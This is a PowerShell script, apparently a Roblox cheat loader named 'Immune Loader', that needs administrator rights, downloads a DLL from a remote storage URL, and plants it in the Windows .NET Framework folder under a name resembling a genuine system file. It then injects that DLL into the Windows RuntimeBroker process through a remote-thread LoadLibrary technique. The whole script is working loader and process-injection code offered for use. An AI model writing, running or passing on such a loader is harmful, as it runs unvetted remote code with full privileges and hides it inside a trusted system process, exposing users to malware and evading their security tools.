#Requires -Version 5.1
#Requires -RunAsAdministrator

param(
    [string]$DllUrl = 'https://eyxbrypeyeqfntyappey.supabase.co/storage/v1/object/public/public-files/sbscmp30_mscorwks.dll'
)

$ErrorActionPreference = 'Stop'

$targetDll = "$env:SystemRoot\Microsoft.NET\Framework\sbscmp30_mscorwks.dll"
$brokerName = 'RuntimeBroker'
$brokerExe = "$env:SystemRoot\System32\$brokerName.exe"
$tempDll = Join-Path $env:TEMP "immune_sbscmp30_$([Guid]::NewGuid().ToString('N')).dll"

function Write-Step([string]$Message, [string]$Color = 'Cyan') {
    Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] $Message" -ForegroundColor $Color
}

try {
    Write-Host ''
    Write-Host '  Immune Loader' -ForegroundColor Cyan
    Write-Host ''

    Write-Step "Downloading DLL..."
    Invoke-WebRequest -Uri $DllUrl -OutFile $tempDll -UseBasicParsing
    if (-not (Test-Path -LiteralPath $tempDll) -or (Get-Item $tempDll).Length -le 0) {
        throw 'Downloaded DLL is missing or empty.'
    }

    Write-Step "Installing to $targetDll"
    Copy-Item -LiteralPath $tempDll -Destination $targetDll -Force
    Unblock-File -LiteralPath $targetDll -ErrorAction SilentlyContinue
    Write-Step "Installed ($((Get-Item $targetDll).Length) bytes)" Green

    Add-Type @'
using System;
using System.Runtime.InteropServices;
public class ImmuneInjector {
    [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int c);
    [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);
    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr h);
    public static bool X(int pid, string d) {
        IntPtr h = OpenProcess(0x1F0FFF, false, pid);
        if (h == IntPtr.Zero) return false;
        IntPtr a = VirtualAllocEx(h, IntPtr.Zero, (uint)((d.Length + 1) * 2), 0x3000, 0x4);
        if (a == IntPtr.Zero) { CloseHandle(h); return false; }
        byte[] b = System.Text.Encoding.Unicode.GetBytes(d);
        uint w;
        if (!WriteProcessMemory(h, a, b, (uint)b.Length, out w)) { CloseHandle(h); return false; }
        IntPtr k = GetModuleHandle("kernel32.dll");
        IntPtr l = GetProcAddress(k, "LoadLibraryW");
        IntPtr t = CreateRemoteThread(h, IntPtr.Zero, 0, l, a, 0, IntPtr.Zero);
        if (t == IntPtr.Zero) { CloseHandle(h); return false; }
        WaitForSingleObject(t, 0xFFFFFFFF);
        CloseHandle(t); CloseHandle(h);
        return true;
    }
}
'@ -ErrorAction Stop

    function Test-BrokerHasDll([int]$ProcessId, [string]$DllPath) {
        $proc = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
        if (-not $proc) { return $false }
        try { return [bool](@($proc.Modules) | Where-Object { $_.FileName -eq $DllPath }) } catch { return $false }
    }

    function Get-InjectionTarget([string]$DllPath) {
        foreach ($proc in @(Get-Process -Name $brokerName -ErrorAction SilentlyContinue)) {
            if (-not (Test-BrokerHasDll $proc.Id $DllPath)) { return $proc }
        }
        return $null
    }

    $target = Get-InjectionTarget $targetDll
    if (-not $target) {
        Write-Step 'Starting RuntimeBroker...'
        Start-Process $brokerExe | Out-Null
        Start-Sleep -Seconds 3
        $target = Get-InjectionTarget $targetDll
    }

    if (-not $target) { throw 'No RuntimeBroker process available for injection.' }

    Write-Step "Injecting into RuntimeBroker PID $($target.Id)..."
    if (-not [ImmuneInjector]::X($target.Id, $targetDll)) { throw 'Injection failed.' }

    Start-Sleep -Seconds 2
    if (-not (Test-BrokerHasDll $target.Id $targetDll)) {
        Write-Step 'Injection completed but module visibility could not be verified.' Yellow
    } else {
        Write-Step 'Immune loaded. Open Roblox.' Green
    }
}
finally {
    if (Test-Path -LiteralPath $tempDll) {
        Remove-Item -LiteralPath $tempDll -Force -ErrorAction SilentlyContinue
    }
}
